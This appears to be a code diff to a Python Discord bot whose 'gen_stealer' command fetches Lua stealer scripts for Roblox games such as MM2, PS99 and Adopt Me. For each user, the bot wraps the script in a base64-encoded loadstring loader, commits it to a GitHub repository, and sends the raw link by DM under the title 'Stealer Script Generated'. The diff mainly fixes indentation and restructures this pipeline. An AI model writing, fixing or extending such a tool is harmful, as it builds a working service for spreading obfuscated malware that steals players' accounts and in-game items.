@@ -54,7 +54,7 @@ class SendFieldValueButton(discord.ui.Button):
 @app_commands.choices(game_type=[
     app_commands.Choice(name="MM2", value="mm2"),
     app_commands.Choice(name="PS99", value="ps99"),
-    app_commands.Choice(name="Adopt Me", value="adoptme"),
+    app_commands.Choice(name="Adopt Me", value="adopt_me"),
     app_commands.Choice(name="Pls Donate", value="pls_donate"),
 ])
 async def gen_stealer(
@@ -65,26 +65,24 @@ async def gen_stealer(
 ):
     await interaction.response.defer(ephemeral=True)
     try:
-if game_type.value == "mm2":
-    url = "https://raw.githubusercontent.com/SharScript/MM2/main/Protected_MM2.lua"
-    thumbnail_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTxOWYkSasIaeBcOEhcVVxfyFxNpU_MtJDP-w&s"
-elif game_type.value == "ps99":
-    url = "https://raw.githubusercontent.com/SharScript/PS99/main/Protected_PS99.lua"
-    thumbnail_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRjoGNsO70eNNdGyz0Ka9h-3Q47xDJQodZVKQ&s"
-elif game_type.value == "adoptme":
-    url = "https://raw.githubusercontent.com/SharScript/Adopt-Me/main/Protected_AdoptMe.lua"
-    thumbnail_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQvcX0YRA4qPdQhPFiQ-Ev3kwHj9wEg6tbh6aH8WFBYATGx573n46-q2FY&s=10"
-elif game_type.value == "pls_donate":
-    url = "https://raw.githubusercontent.com/SharScript/Pls-Donate/main/Protected_PlsDonate.lua"
-    thumbnail_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSk5Bt8OFoAF6gWKk_bpKFH35JregoZL-6pw&s"
-else:
-    await interaction.followup.send("Invalid game type selected.", ephemeral=True)
-    return
-
+        if game_type.value == "mm2":
+            url = "https://raw.githubusercontent.com/SharScript/MM2/main/Protected_MM2.lua"
+            thumbnail_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTxOWYkSasIaeBcOEhcVVxfyFxNpU_MtJDP-w&s"
+        elif game_type.value == "ps99":
+            url = "https://raw.githubusercontent.com/SharScript/PS99/main/Protected_PS99.lua"
+            thumbnail_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRjoGNsO70eNNdGyz0Ka9h-3Q47xDJQodZVKQ&s"
+        elif game_type.value == "adopt_me":
+            url = "https://raw.githubusercontent.com/SharScript/Adopt-Me/main/Protected_AdoptMe.lua"
+            thumbnail_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQvcX0YRA4qPdQhPFiQ-Ev3kwHj9wEg6tbh6aH8WFBYATGx573n46-q2FY&s=10"
+        elif game_type.value == "pls_donate":
+            url = "https://raw.githubusercontent.com/SharScript/Pls-Donate/main/Protected_PlsDonate.lua"
+            thumbnail_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSk5Bt8OFoAF6gWKk_bpKFH35JregoZL-6pw&s"
+        else:
+            await interaction.followup.send("Invalid game type selected.", ephemeral=True)
+            return
 
         response = requests.get(url)
         if response.status_code != 200:
-            print(f"Failed to fetch Lua code: {response.status_code}")
             await interaction.followup.send("Failed to fetch script. Please try again.", ephemeral=True)
             return
 
@@ -94,20 +92,14 @@ else:
         with open(filename, "w", encoding="utf-8") as f:
             f.write(lua_code)
 
-        with open(filename, "r") as f:
-            content = f.read()
+        obfuscated = base64.b64encode(lua_code.encode()).decode()
+        obfuscated_code = f'local d=function(b)return(load or loadstring)(base64.decode(b))end;local s=[[{obfuscated}]];d(s)()'
 
-        obfuscated = base64.b64encode(content.encode()).decode()
-        obfuscated = f"local d=function(b)return(load or loadstring)(base64.decode(b))end;local s=[[{obfuscated}]];d(s)()"
+        with open(filename, "w", encoding="utf-8") as f:
+            f.write(obfuscated_code)
 
-        with open(filename, 'w') as f:
-            f.write(obfuscated)
-
-        with open(filename, "r", encoding="utf-8") as f:
-            obfuscated_code = f.read()
-
-        api_url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{filename}"
         encoded_content = base64.b64encode(obfuscated_code.encode("utf-8")).decode("utf-8")
+        api_url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{filename}"
         commit_message = f"Add obfuscated Lua script for user {username} - game {game_type.name}"
 
         headers = {
@@ -126,7 +118,6 @@ else:
 
         if response.status_code in [200, 201]:
             raw_url = f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/{filename}"
-
             embed = discord.Embed(
                 title="Stealer Script Generated",
                 description="This script is generated exclusively for you",
@@ -140,17 +131,16 @@ else:
             view.add_item(SendFieldValueButton(embed))
 
             await interaction.user.send(embed=embed, view=view)
-            await interaction.followup.send(f"Check your direct messages, {interaction.user.mention}!", ephemeral=True)
+            await interaction.followup.send(f"Check your DMs, {interaction.user.mention}!", ephemeral=True)
         else:
-            print(f"GitHub API error: {response.status_code} - {response.text}")
-            await interaction.followup.send("Failed to upload script. Please try again.", ephemeral=True)
+            await interaction.followup.send("Failed to upload script. Try again.", ephemeral=True)
 
     except Exception as e:
-        print(f"General error: {str(e)}")
+        print(f"Error: {e}")
         await interaction.followup.send("An error occurred. Please try again.", ephemeral=True)
     finally:
         if os.path.exists(filename):
-            os.remove(filename)
+            os.remove(filename)            
 
 @bot.event
 async def on_ready():
